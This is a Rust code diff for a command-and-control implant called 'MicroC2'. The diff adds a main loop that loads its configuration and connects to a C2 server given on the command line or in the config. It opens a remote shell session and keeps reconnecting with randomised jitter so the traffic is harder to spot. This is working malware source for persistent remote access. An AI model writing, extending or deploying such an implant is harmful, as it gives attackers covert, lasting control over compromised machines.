@@ -18,8 +18,30 @@ use std::os::raw::c_int;
 // Main entry point for standalone executable
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
-    // Call the shared agent code
-    run_agent().await
+    println!("[STARTUP] MicroC2 Agent starting...");
+    
+    // Load configuration or use command line args
+    let config = AgentConfig::load()?;
+    let server_addr = env::args()
+        .nth(1)
+        .unwrap_or_else(|| config.get_server_url());
+    
+    // Use payload ID from config as agent ID
+    let agent_id = config.payload_id.clone();
+    println!("[INFO] Agent ID: {}", agent_id);
+    
+    println!("[NETWORK] Attempting connection to C2: {}", server_addr);
+    
+    loop {
+        match run_shell(&server_addr, &agent_id).await {
+            Ok(_) => println!("[INFO] Shell session ended"),
+            Err(e) => println!("[ERROR] Shell error: {}. Retrying...", e),
+        }
+        
+        // Add jitter to reconnection attempts
+        let sleep_time = config.sleep_interval + (rand::random::<u64>() % config.jitter);
+        tokio::time::sleep(tokio::time::Duration::from_secs(sleep_time)).await;
+    }
 }
 
 // Shared agent code used by both executable and DLL
